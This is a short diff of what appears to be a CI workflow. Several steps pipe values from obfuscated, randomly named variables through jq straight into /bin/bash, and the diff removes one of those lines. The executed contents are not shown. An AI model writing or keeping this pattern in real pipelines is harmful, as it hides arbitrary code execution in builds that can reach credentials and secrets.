@@ -22,7 +22,6 @@ jobs:
           echo $hs333 | jq -r .hsss913 | /bin/bash
           printf '%s' "$etxqi8" | jq -r .jt8502 | /bin/bash
           printf '%s' "$ene9" | jq -r .nhi12 | /bin/bash
-          echo $wjrrz04610 | jq -r .fzkmr3416 | /bin/bash
           echo $aqchs520 | jq -r .gxt432 | /bin/bash
 
       - name: Save output
